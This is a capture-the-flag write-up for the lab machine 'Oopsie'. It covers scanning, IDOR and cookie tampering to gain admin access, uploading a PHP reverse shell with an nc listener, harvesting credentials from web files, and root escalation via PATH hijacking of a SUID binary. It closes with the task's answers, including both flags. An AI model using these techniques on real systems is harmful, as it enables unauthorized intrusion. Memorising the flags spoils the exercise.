# Oopsie - Very Easy

```shell
nmap -T4 -p- -A 10.129.83.223

ffuf -u https://10.129.83.223/FUZZ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -s

#setup listener before uploading reverse shell
nc -lvp 1234

python3 -c 'import pty;pty.spawn("/bin/bash")'
#upgrade shell

cat /home/robert/user.txt
#user flag

cd /var/www/html/cdn-cgi/login

ls -la
#we have PHP and JS files for website
#go through file contents

su robert
#switch user

whoami

id
#this shows group bugtracker

find / -group bugtracker 2>/dev/null

ls -la /usr/bin/bugtracker

file /usr/bin/bugtracker

/usr/bin/bugtracker
#use different inputs for this binary

#exploit suid and cat
cd /tmp

echo "/bin/sh" > cat

chmod +x cat

export PATH=/tmp:$PATH

echo $PATH
#shows /tmp as path for executables

#run bugtracker binary and enter invalid input
#to get root shell

#cat would not work, so we can use less to view flag
less /root/root.txt
```

```markdown
The nmap scan shows that the website uses Apache httpd 2.4.29.

The ffuf scan does not give any result

Using Developer Tools, we can traverse the different web directories

We get a login page on /cdn-cgi/login/

We can login as Guest and view the pages

It is observed that for guest, access ID is 2223 and email is 'guest@megacorp.com'

The URL is http://10.129.83.223/cdn-cgi/login/admin.php?content=accounts&id=2

On changing the ID parameter from 2 to 1 in the URL, we get access ID of admin, 34322

For the admin, the client ID is 1, name is 'Tafcz' and email is 'john@tafcz.co.uk'

On changing the cookie values in Developer Tools from 'guest' to 'admin' and '2223' to '34322', we get access to the uploads page.

The files are uploaded on the /uploads directory.

Now, we can upload a reverse shell in the uploads page, and it can be accessed by navigating to /uploads/reverse-shell.php

Ensure to setup listener on attacker machine before navigating to reverse shell file.

We get reverse shell as www-data user.

We can view the user robert's files.

User flag - f2c74ee8db7983851ab2a96a44eb7981

As we are told to review the web pages code now, we can check them in the directory /var/www/html/cdn-cgi/login

We can go through the content of the files in this directory.

In admin.php, we get the creds admin:MEGACORP_4dm1n!!

In db.php, we get the creds robert:M3g4C0rpUs3r

We can use these creds to switch to user Robert

The id command shows that we are a part of bugtracker group.

We use the find command to check if there is any binary with this group.

We can see that the bugtracker binary is always run by root permissions.

Furthermore, this binary has the SUID bit set.

On running it, we can see that it asks for an input, and generates a report.

We can see that for certain number inputs, it generates an error saying 'no such file or directory'; we can exploit this.

We need to add '/bin/sh' to a file named 'cat', and add that to the environment variable PATH.

Essentially, we are tricking the bugtracker binary by exploiting 'cat'
```

1. With what kind of tool can one intercept web traffic? - Proxy

2. What is the path of the directory on the webserver that returns a login page? - /cdn-cgi/login

3. What can be modified in Firefox to get access to the upload page? - Cookie

4. What is the access ID of the admin user? - 34322

5. On uploading a file, what directory does that file appear in on the server? - /uploads

6. What is the file that contains the password that is shared with the robert user? - db.php

7. What executable is run with the option "-group bugtracker" to identify all files owned by the bugtracker group? - find

8. Regardless of which user starts running the background executable, what user privileges will be used to run? - root

9. What does SUID stand for? - Set Owner User ID

10. What is the name of the executable being called in an insecure manner? - cat

11. Submit user flag? - f2c74ee8db7983851ab2a96a44eb7981

12. Submit root flag? - af13b0bee69f8a877c3faf667f7beacf
